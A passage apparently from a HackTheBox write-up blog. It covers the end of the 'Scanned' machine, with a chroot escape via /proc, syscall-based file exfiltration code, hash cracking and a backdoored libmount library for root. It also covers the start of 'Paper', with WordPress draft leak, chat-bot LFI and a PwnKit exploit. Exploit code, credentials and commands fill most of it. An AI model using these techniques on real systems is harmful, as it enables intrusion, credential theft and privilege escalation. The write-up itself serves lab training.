 unsigned long r9;    unsigned long ret;} registers;log_syscall now writes the traced syscalls to a log file /log.sandbox.c/log_syscallvoid log_syscall(struct user_regs_struct regs, unsigned long ret) {    registers result;    result.rax = regs.orig_rax;    result.rdi = regs.rdi;    result.rsi = regs.rsi;    result.rdx = regs.rdx;    result.r10 = regs.r10;    result.r8 = regs.r8;    result.r9 = regs.r9;    result.ret = ret;    int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777);    if (fd == -1) {        return;    }    write(fd, &amp;result, sizeof(registers));    close(fd);The log file now get‚Äôs rendered on the viewer route in django. Looking at malscanner/viewer/syscalls.py we can see a list of supported syscalls.malscanner/viewer/syscalls.py...[snip]...syscalls = [    [SyscallClass.Low, \"read\", 0, 3],    [SyscallClass.Low, \"write\", 1, 3],    [SyscallClass.Medium, \"open\", 2, 3],    [SyscallClass.Low, \"close\", 3, 1],    [SyscallClass.Medium, \"stat\", 4, 2],    [SyscallClass.Medium, \"fstat\", 5, 2],    [SyscallClass.Medium, \"lstat\", 6, 2],    [SyscallClass.Medium, \"access\", 21, 2],    [SyscallClass.Low, \"alarm\", 37, 1],    [SyscallClass.High, \"socket\", 41, 3],    [SyscallClass.High, \"connect\", 42, 3],    [SyscallClass.High, \"accept\", 43, 3],    [SyscallClass.High, \"shutdown\", 48, 2],    [SyscallClass.High, \"bind\", 49, 3],    [SyscallClass.High, \"listen\", 50, 2],    [SyscallClass.Medium, \"clone\", 56, 5],    [SyscallClass.Medium, \"fork\", 57, 0],    [SyscallClass.Medium, \"vfork\", 58, 0],    [SyscallClass.High, \"execve\", 59, 3],    [SyscallClass.High, \"kill\", 62, 2],    [SyscallClass.Medium, \"uname\", 63, 1],    [SyscallClass.Medium, \"getdents\", 78, 3],    [SyscallClass.Medium, \"getcwd\", 79, 2],    [SyscallClass.Medium, \"chdir\", 80, 1],    [SyscallClass.Medium, \"fchdir\", 81, 1],    [SyscallClass.High, \"rename\", 82, 2],    [SyscallClass.Low, \"mkdir\", 83, 2],    [SyscallClass.High, \"rmdir\", 84, 1],    [SyscallClass.High, \"unlink\", 87, 1],    [SyscallClass.Medium, \"chmod\", 90, 2],    [SyscallClass.Medium, \"fchmod\", 91, 2],    [SyscallClass.High, \"chown\", 92, 3],    [SyscallClass.High, \"fchown\", 93, 3],    [SyscallClass.High, \"ptrace\", 101, 4],]...[snip]...Since we are in a chroot jail and the PID + NET namepspace is unshared we have to think of another way to exploit the situation. One way to do this is the mounted /proc filesystem. Using PID 1, FD 3 and the ../ sequence we can traverse back outside of the chroot jail. Next we need a way to exfiltrate data from the system, which we can do using syscalls that in turn get logged and output on the website. To test our exfiltration we can first compile a small test binary with a string to exfiltrate. Multiple syscalls for this cause would be possible but we will use alarm in this case. Alarm takes an unsigned integer as input so we have to convert our char array. Since an unsigned integer is the size of 4 on linux systems the string test is just right for the first attempt. We convert the char pointer to an unsigned int pointer and run a syscall on the value (37 representing the alarm syscall).test.c#include \"unistd.h\"#include \"string.h\"int main (int argc, char *argv[]){  char* buf = \"test\";  unsigned int val = 0;  val = *((unsigned int *)(&amp;buf[0]));  syscall(37, val);  return 0;}After compiling the binary we upload it and after the sleep we get a result.$ gcc test.c -o testingConverting the hex back to ascii we see our exfiltration technique is working and we are getting back the string tset. The order here is reversed because it is a little endian system.$ echo -n '74736574' | xxd -r -ptsetSince we got exfiltration working we can next try to exfiltrate an actual file. Because we are running under the uid of 1001 we first choose a world readable one which also gives more information about the system like /etc/passwdexfil_passwd.c#include \"unistd.h\"#include \"fcntl.h\"int main (int argc, char *argv[]){  char buf[0x8];  int fd = open(\"/proc/1/fd/3/../../../../../../etc/passwd\", O_RDONLY);  while(read(fd, buf, 0x4) != 0)  {    unsigned int val = 0;    val = *((unsigned int*)(&amp;buf[0]));    syscall(37,val);  }  close(fd);  return 0;}Checking the first alarm it looks like it is working with toor being root in reverse.$ echo -n '746f6f72' | xxd -r -ptoorWe are now able to read files on the system but converting them manually and recompiling the binary would be very time consuming. This short python script will do the work for us here. it first fills in the file we want to read into C source code and compiles it. Then it uploads the binary to the malscanner, retrieves the response, parses it and saves the exfiltrated file on our system.import requestsimport uuidimport osimport sysfrom binascii import unhexlifyFILENAME = sys.argv[1]URL = 'http://10.129.159.163/scanner/upload/'C_CODE = f'''#include \"unistd.h\"#include \"fcntl.h\"int main (int argc, char *argv[]){  char buf[0x4];  int fd = open(\"{FILENAME}\", O_RDONLY);  while(read(fd, buf, 0x4) != 0)  {    unsigned int val = 0;    val = *((unsigned int *)(&amp;buf[0]));    syscall(37, val);  }  close(fd);  return 0;}'''guid_source = uuid.uuid4()guid_bin = uuid.uuid4()source = open(f'./{guid_source}.c', 'w')source.write(C_CODE)source.close()os.system(f'gcc ./{guid_source}.c -o {guid_bin}')multipart_form_data = {    'file': (f'{guid_bin}', open(f'./{guid_bin}', 'rb')),}r = requests.post(URL, files=multipart_form_data, allow_redirects=True)os.system(f'rm ./{guid_source}.c {guid_bin}')out = b''valid_lines = [line for line in r.text.split('\\n') if 'alarm(0x' in line]for line in valid_lines:    exfil = line.split('alarm(0x')[1].split(') = 0x')[0]    exfil = '0' * (8 - len(exfil)) + exfil    out += unhexlify(exfil)[::-1]save_out = open(FILENAME.replace('/', '_'), 'wb')save_out.write(out)save_out.close()Testing it with the /etc/passwd file again we can now comfortably retrieve it.$ python3 readfile.py '/proc/1/fd/3/../../../../../../etc/passwd'$ cat _proc_1_fd_3_.._.._.._.._.._.._etc_passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinclarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologinginLooking for possible interesting files on the system there is a malscanner.db in the webroot of the source code.$ ls malscannermalscanner     manage.py         sandbox  static     uploads       viewermalscanner.db  requirements.txt  scanner  templates  uwsgi_paramsThe end of the settings.py django configuration file leaks the root of the web application so we know where to look for the database.FILE_PATH = \"/var/www/malscanner/uploads\"SBX_PATH = \"/var/www/malscanner/sandbox\"Using our script we can retrieve the database and opening it there is a hash for the user clarence inside which also is a user on the os.$ python3 readfile.py '/proc/1/fd/3/../../../../../../var/www/malscanner/malscanner.db'$ sqlite3 _proc_1_fd_3_.._.._.._.._.._.._var_www_malscanner_malscanner.dbSQLite version 3.37.2 2022-01-06 13:25:41Enter \".help\" for usage hints.sqlite&gt; .tablesauth_group                  auth_user_user_permissionsauth_group_permissions      django_admin_logauth_permission             django_content_typeauth_user                   django_migrationsauth_user_groups            django_sessionsqlite&gt; select * from auth_user;1|md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf|2021-09-14 18:39:55.237074|1|clarence|||1|1|2021-09-14 18:36:46.227819|Using hashcat and rockyou we are able to crack it quite quickly.$ hashcat -m 20 -a 0 -O hash rockyou.txthashcat (v6.2.5) starting...[snip]...886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecryingSession..........: hashcatStatus...........: CrackedHash.Mode........: 20 (md5($salt.$pass))Hash.Target......: 9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752mTime.Started.....: Tue Feb  1 00:53:57 2022 (0 secs)Time.Estimated...: Tue Feb  1 00:53:57 2022 (0 secs)Kernel.Feature...: Optimized KernelGuess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 15539.8 kH/s (2.49ms) @ Accel:8192 Loops:1 Thr:32 Vec:1Recovered........: 1/1 (100.00%) DigestsProgress.........: 5243993/14344388 (36.56%)Rejected.........: 1113/5243993 (0.02%)Restore.Point....: 2622142/14344388 (18.28%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: yayavega -&gt; n11575yHardware.Mon.#1..: Temp: 41c Fan: 33% Util:  0% Core:1733MHz Mem:4006MHz Bus:16Started: Tue Feb  1 00:53:52 2022Stopped: Tue Feb  1 00:53:59 2022Testing the credentials clarence:onedayyoufeellikecrying with ssh we are able to log into the machine and grab the user flag.$ ssh clarence@10.129.159.163clarence@10.129.159.163's password:Linux scanned 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Jan 31 23:12:39 2022 from 10.10.14.73clarence@scanned:~$ wc -c user.txt33 user.txtRootWe noticed earlier that sandbox gets the cap_setuid set when compiling. This is also the case on this system. Furthermore there seemed to be interesting file permission on the copied libraries and on the whole jail directory itself.clarence@scanned:~$ /usr/sbin/getcap /var/www/malscanner/sandbox/sandbox/var/www/malscanner/sandbox/sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eipChecking on the system the directory is world readable. This means we can copy anything inside while we run a binary with sandbox. Since we are also able to access the rest of the filesystem through /proc/1/fd/3 we can run another binary from inside the sandbox. These two things mean we are able to make a binary on the host run with a backdoored library version.clarence@scanned:~$ ls -al /var/www/malscanner/sandbox/jails/total 8drwxrwxrwx 2 root root 4096 Jan 13 17:27 .drwxr-xr-x 3 root root 4096 Jan 13 17:27 ..Doing this with a suid binary we should be able to achieve code execution as root so the first step is to look at the suid binaries available on the system.clarence@scanned:~$ find / -perm -4000 2&gt;/dev/null/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/chsh/usr/bin/su/usr/bin/fusermount/usr/bin/passwd/usr/bin/sudo/usr/bin/mount/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chfn/usr/bin/umountIn this case we choose mount as our target. Using ldd we can see all the libraries it imports.clarence@scanned:/var/www/malscanner/sandbox$ ldd /usr/bin/mount        linux-vdso.so.1 (0x00007ffe1d1f2000)        libmount.so.1 =&gt; /lib/x86_64-linux-gnu/libmount.so.1 (0x00007f0af75d4000)        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0af740f000)        libblkid.so.1 =&gt; /lib/x86_64-linux-gnu/libblkid.so.1 (0x00007f0af73be000)        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f0af7392000)        /lib64/ld-linux-x86-64.so.2 (0x00007f0af7647000)        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f0af72fa000)        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0af72f4000)        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f0af72d0000)To choose the one we want to backdoor we can run mount from within the sandbox and look at the error message to get the first library missing. To have an interactive process from where we can call mount one way is to run sandbox with /bin/shclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 1$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp/proc/1/fd/3/../../../../../../usr/bin/mount: error while loading shared libraries: libmount.so.1: cannot open shared object file: No such file or directory$ Killed subprocessHaving identified the library to backdoor we now need to know all the functions inside it. To have better access to it we use scp to copy the library over to our machine.$ scp clarence@10.129.160.252:/lib/x86_64-linux-gnu/libmount.so.1 .clarence@10.129.160.252's password:libmount.so.1                                                                                                                                                                                                100%  367KB 225.1KB/s   00:01$Using objdump we can retrieve all the functions and with awk we can create a C source file calling each one of them. For the function call we will simply output which function got called so we know what to backdoor.$ objdump -T libmount.so.1  | grep 'DF .text'  | awk -F' ' '{print\"int \" $7\"() { puts(\\\"\"$7\" got called !!\\\"); return 0; }\"}' &gt; evillib.cFinally we also add the necessary header files at the top of the source code and compile it to a shared library.evillib.c#include \"stdio.h\"#include \"stdlib.h\"int mnt_context_prepare_mount() { puts(\"mnt_context_prepare_mount got called !!\"); return 0; }int mnt_context_syscall_called() { puts(\"mnt_context_syscall_called got called !!\"); return 0; }int mnt_table_set_trailing_comment() { puts(\"mnt_table_set_trailing_comment got called !!\"); return 0; }int mnt_context_get_target() { puts(\"mnt_context_get_target got called !!\"); return 0; }int mnt_fs_get_size() { puts(\"mnt_fs_get_size got called !!\"); return 0; }int mnt_table_get_trailing_comment() { puts(\"mnt_table_get_trailing_comment got called !!\"); return 0; }int mnt_get_fstype() { puts(\"mnt_get_fstype got called !!\"); return 0; }int mnt_resolve_spec() { puts(\"mnt_resolve_spec got called !!\"); return 0; }...[snip]...\tint mnt_context_disable_mtab() { puts(\"mnt_context_disable_mtab got called !!\"); return 0; }int mnt_fs_get_target() { puts(\"mnt_fs_get_target got called !!\"); return 0; }int mnt_update_get_mflags() { puts(\"mnt_update_get_mflags got called !!\"); return 0; }int mnt_table_parse_swaps() { puts(\"mnt_table_parse_swaps got called !!\"); return 0; }int mnt_context_set_target_ns() { puts(\"mnt_context_set_target_ns got called !!\"); return 0; }int mnt_table_parse_stream() { puts(\"mnt_table_parse_stream got called !!\"); return 0; }int mnt_update_get_filename() { puts(\"mnt_update_get_filename got called !!\"); return 0; }int mnt_table_last_fs() { puts(\"mnt_table_last_fs got called !!\"); return 0; }int mnt_split_optstr() { puts(\"mnt_split_optstr got called !!\"); return 0; }int mnt_context_get_fstype() { puts(\"mnt_context_get_fstype got called !!\"); return 0; }$ gcc -shared -fPIC -o evillib.so evillib.cNext we transfer it over to the machine and prepare the command to execute in sh to just paste it later since we are dealing with a limited timeframe.clarence@scanned:/var/www/malscanner/sandbox$ wget 10.10.14.75:8000/evillib.so -O /tmp/evillib.so--2022-02-02 20:41:40--  http://10.10.14.75:8000/evillib.soConnecting to 10.10.14.75:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 69752 (68K) [application/octet-stream]Saving to: ‚Äò/tmp/evillib.so‚Äô/tmp/evillib.so                                             100%[==========================================================================================================================================&gt;]  68.12K  --.-KB/s    in 0.09s2022-02-02 20:41:40 (755 KB/s) - ‚Äò/tmp/evillib.so‚Äô saved [69752/69752]For the execution we open up another ssh session where we will prepare the copying of the bad library. First we create a variable to hold the uuid for our jail. We do this to keep track which jail names are already blocked currently. Next is a sleep command so we can start the sandbox during the sleep and then the backdoored library gets copied into the created jail.clarence@scanned:/var/www/malscanner/sandbox$ UNIQUE=1; sleep 2; cp /tmp/evillib.so /var/www/malscanner/sandbox/jails/$UNIQUE/lib/libmount.so.1After we start the command with the sleep we run /bin/sh inside sandbox on our other ssh session specifying the same uuid.clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 1$Once the copy command finishes we run our prepared mount command inside the sandbox‚Äôs /bin/sh. There are some errors about no version information being available but at the end of the output we see that mnt_init_debug and mnt_new_context got called by mount.$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)mnt_init_debug got called !!mnt_new_context got called !!mount: libmount context allocation failed: Success$ Killed subprocessExitedSince mnt_init_debug got called first we will choose this function to run our code. All it does is set the uid to 0, confirms it got set and the gives bash the suid bit on the system.#include \"stdio.h\"#include \"stdlib.h\"...[snip]...\tint mnt_init_debug() { puts(\"mnt_init_debug got called !!\"); setuid(0); printf(\"uid %d\\n\", getuid()); system(\"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash\"); return 0; }...[snip]...\tNow all we have to do is perform the steps from before. First we compile the library again and transfer it over to the target.gcc -shared -fPIC -o evillib.so evillib.cevillib.c: In function ‚Äòmnt_init_debug‚Äô:evillib.c:19:62: warning: implicit declaration of function ‚Äòsetuid‚Äô [-Wimplicit-function-declaration]   19 | int mnt_init_debug() { puts(\"mnt_init_debug got called !!\"); setuid(0); printf(\"uid %d\\n\", getuid()); system(\"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash\"); return 0; }      |                                                              ^~~~~~evillib.c:19:92: warning: implicit declaration of function ‚Äògetuid‚Äô [-Wimplicit-function-declaration]   19 | int mnt_init_debug() { puts(\"mnt_init_debug got called !!\"); setuid(0); printf(\"uid %d\\n\", getuid()); system(\"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash\"); return 0; }clarence@scanned:/var/www/malscanner/sandbox$ rm /tmp/evillib.soclarence@scanned:/var/www/malscanner/sandbox$ wget 10.10.14.75:8000/evillib.so -O /tmp/evillib.so--2022-02-02 20:47:30--  http://10.10.14.75:8000/evillib.soConnecting to 10.10.14.75:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 69960 (68K) [application/octet-stream]Saving to: ‚Äò/tmp/evillib.so‚Äô/tmp/evillib.so                                             100%[==========================================================================================================================================&gt;]  68.32K  --.-KB/s    in 0.09s2022-02-02 20:47:30 (754 KB/s) - ‚Äò/tmp/evillib.so‚Äô saved [69960/69960]We increment our uuid value so sandbox does not exit because the jail name exits. Then we run the sleep command first again and start /bin/sh in the sandbox with the incremented uuid.clarence@scanned:/var/www/malscanner/sandbox$ UNIQUE=2; sleep 2; cp /tmp/evillib.so /var/www/malscanner/sandbox/jails/$UNIQUE/lib/libmount.so.1Like before we run our prepared mount statement inside the sandbox again after the copy command finished. In the output we can see that the uid of the process running our function is now 0, indicating our backdoored code got executed successfully.clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 2$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)mnt_init_debug got called !!uid 0mnt_new_context got called !!mount: libmount context allocation failed: Success$ Killed subprocessExitedNow we can simply drop into a root bash shell and add the root flag to our collection.clarence@scanned:/var/www/malscanner/sandbox$ bash -pbash-5.1# wc -c /root/root.txt33 /root/root.txt"
  },
  
  {
    "title": "Hack The Box - Paper",
    "url": "/posts/paper/",
    "categories": "HackTheBox",
    "tags": "linux, easy, wordpress, rocket chat, cve, lfi, unintended, pkexec, polkit",
    "date": "2022-06-18 00:00:00 +0800",
    





    
    "snippet": "UserPaper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installa...",
    "content": "UserPaper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine.NmapAs usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.All ports$ sudo nmap -n -p- -T4 10.129.158.20Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 20:52 CETNmap scan report for 10.129.158.20Host is up (0.028s latency).Not shown: 65528 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    open     http443/tcp   open     httpsNmap done: 1 IP address (1 host up) scanned in 1130.89 secondsScript and Version$ sudo nmap -n -sC -sV -p22,80,443 10.129.158.20Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 21:14 CETNmap scan report for 10.129.158.20Host is up (0.033s latency).PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)| ssh-hostkey:|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-title: HTTP Server Test Page powered by CentOS|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after:  2022-07-08T10:32:34|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9|_http-title: 400 Bad Request| http-methods:|_  Potentially risky methods: TRACE|_ssl-date: TLS randomness does not represent time| tls-alpn:|_  http/1.1Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.95 secondsWordpress draftFrom the open ports http and https seem to be most promising. Opening port 80 in our browser we see the the Centos http server test page.Intercepting a request in burp and looking at the response headers in repeater we can find that it leaks the vhost office.paper which we add to our /etc/hosts file.Opening http://office.paper in our browser we see a wordpress blog.Scanning the page using wpscan we can identify the version to be 5.3 and thus out of date.$ wpscan --url http://office.paper/  -e u...[snip]...[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). | Found By: Rss Generator (Passive Detection) |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt; |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;...[snip]...[i] User(s) Identified:[+] prisonmike | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Rss Generator (Passive Detection) |  Wp Json Api (Aggressive Detection) |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] nick | Found By: Wp Json Api (Aggressive Detection) |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] creedthoughts | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sat Feb  5 21:35:30 2022[+] Requests Done: 58[+] Cached Requests: 6[+] Data Sent: 15.658 KB[+] Data Received: 254.476 KB[+] Memory used: 175.559 MB[+] Elapsed time: 00:00:10Checking for vulnerabilities in the installed version we find this describing an easy way to leak drafts. Using it as described with asc sorting it we get an error, however changing it to desc we get a draft leaking a rocket chat installation with the secret registration url.Rocket chat LFIAfter adding chat.office.paper to our /etc/hosts aswell and opening the registration link in our browser we are able to register an account on rocket chat.Once logged in with the created account there is an interesting discussion in general where we see some bot functionality. Especially the file retrieval seems to be interesting.Starting a private conversation with the bot and testing if we can go back to the file system root with ../ it works and we are able to retrieve the /etc/passwd file.Checking the environment parameters of rocket chat with  recyclops file ../../../../proc/self/environ we find the installation is running from the user dwight‚Äôs home directory and we also get the password.Testing for password reuse over ssh we are able to log into the machine and grab the user flag.$ ssh dwight@office.paperdwight@office.paper's password:Activate the web console with: systemctl enable --now cockpit.socketLast login: Tue Feb  1 09:14:33 2022 from 10.10.14.23[dwight@paper ~]$ wc -c user.txt33 user.txtRootpkexecUntil some time after release there was an unintended way to obtain root abusing a vulnerable pkexec version.Checking for suid binaries we can see that pkexec is installed on the machine.[dwight@paper ~]$ find / -perm -4000 2&gt;/dev/null/usr/bin/fusermount/usr/bin/chage/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/mount/usr/bin/su/usr/bin/umount/usr/bin/crontab/usr/bin/pkexec/usr/bin/passwd/usr/bin/chfn/usr/bin/chsh/usr/bin/at/usr/bin/sudo/usr/bin/fusermount3/usr/sbin/grub2-set-bootflag/usr/sbin/pam_timestamp_check/usr/sbin/unix_chkpwd/usr/sbin/userhelper/usr/sbin/mount.nfs/usr/lib/polkit-1/polkit-agent-helper-1/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/libexec/qemu-bridge-helper/usr/libexec/cockpit-session/usr/libexec/sssd/krb5_child/usr/libexec/sssd/ldap_child/usr/libexec/sssd/proxy_child/usr/libexec/sssd/selinux_child/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper/usr/libexec/Xorg.wrapRetrieving it‚Äôs version we see it is vulnerable to the recent CVE-2021-4034.[dwight@paper ~]$ pkexec --versionpkexec version 0.115We can use this PoC to exploit pkexec and obtain root on the machine.Since make is installed on the machine we clone the repo tar it up and scp it to the target as dwight.$ git clone https://github.com/luijait/PwnKit-ExploitCloning into 'PwnKit-Exploit'...remote: Enumerating objects: 224, done.remote: Counting objects: 100% (224/224), done.remote: Compressing objects: 100% (224/224), done.remote: Total 224 (delta 119), reused 4 (delta 0), pack-reused 0Receiving objects: 100% (224/224), 64.38 KiB | 4.29 MiB/s, done.Resolving deltas: 100% (119/119), done.$ tar -czf PwnKit-Exploit.tar.gz PwnKit-Exploit$ scp ./PwnKit-Exploit.tar.gz dwight@office.paper:/tmpdwight@office.paper's password:PwnKit-Exploit.tar.gz                                                                                                                                                                                        100%   92KB 791.0KB/s   00:00There we unpack the archive and ‚Äúmake‚Äù the binary.[dwight@paper tmp]$ tar -xf PwnKit-Exploit.tar.gz[dwight@paper tmp]$ cd PwnKit-Exploit/[dwight@paper PwnKit-Exploit]$ makecc -Wall    exploit.c   -o exploitRunning the exploit we get dropped into a root shell.[dwight@paper PwnKit-Exploit]$ ./exploitCurrent User before execute exploithacker@victim$whoami: dwightExploit written by @luijait 